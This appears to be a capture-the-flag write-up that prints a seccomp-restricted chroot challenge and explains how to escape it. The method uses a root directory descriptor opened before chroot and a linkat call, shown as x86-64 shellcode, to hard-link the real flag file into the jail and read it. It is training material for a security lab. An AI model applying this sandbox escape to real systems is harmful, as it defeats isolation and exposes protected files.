#metadata(
  (
    title: "Bypassing chroot with linkat",
    description: "Using the linkat syscall to create a hard link to the real flag inside the jail, bypassing chroot restrictions.",
    date: "2025-12-30",
    order: 5,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Bypassing Chroot with Linkat
== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    assert(argc > 1);

    // Checking to make sure you're not trying to open the flag.
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    assert(chroot(jail_path) == 0);

    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(linkat), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

= Bypassing chroot with linkat

== Introduction

In this level, `openat` is blocked by seccomp, but `linkat` is allowed. We use this to bring the flag into our reach.

== Vulnerability Analysis

The program follows the same pattern as Level 4 (open a directory before `chroot`), but the seccomp filter only permits `linkat`, `open`, `read`, `write`, and `sendfile`.

== Exploitation Steps

=== 1. Leaking the Root FD
Pass `/` as `argv[1]` to get an FD to the real root.

=== 2. Creating a Link
Use `linkat` to create a hard link from the real `/flag` (relative to our leaked FD) to a new file inside our jail.

```nasm
/* linkat(3, "flag", AT_FDCWD, "my_flag", 0) */
mov rdi, 3
lea rsi, [rip + flag_str]
mov rdx, -100 /* AT_FDCWD */
lea r10, [rip + link_str]
mov r8, 0
mov rax, 265 /* SYS_linkat */
syscall
```

=== 3. Accessing the Flag
Now that a link named `my_flag` exists within the jail, we can simply `open("my_flag")` and read it.
